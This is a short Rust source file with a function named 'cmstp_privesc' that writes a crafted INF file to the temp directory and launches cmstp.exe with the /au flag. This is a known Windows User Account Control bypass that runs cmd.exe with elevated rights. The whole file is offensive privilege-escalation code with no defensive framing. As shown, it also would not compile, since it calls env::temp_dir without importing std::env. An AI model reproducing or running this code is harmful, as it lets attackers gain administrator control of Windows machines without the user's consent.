use std::fs;
use std::path::Path;
use std::process::Command;

fn cmstp_privesc() -> std::io::Result<()> {
    let ini_file_name = "tmp.ini";
    let executable_name = "cmstp.exe";
    let ini_content = "[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
c:\\windows\\system32\\cmd.exe
taskkill /IM cmstp.exe /F
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
[AllUSer_LDIDSection]
\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"\"
[Strings]
ServiceName=\"COCgeUyF\"
ShortSvcName=\"COCgeUyF\"";

    let temp_dir = env::temp_dir();
    let ini_path = temp_dir.join(ini_file_name);

    // Write the INI file to the temporary directory
    fs::write(&ini_path, ini_content)?;

    // Kill cmstp.exe
    Command::new("taskkill")
        .args(&["/IM", executable_name, "/F"])
        .status()?;

    // Run cmstp.exe with the /au flag and the path to the INI file
    Command::new(executable_name)
        .args(&["/au", &ini_path.to_str().unwrap()])
        .status()?;

    Ok(())
}
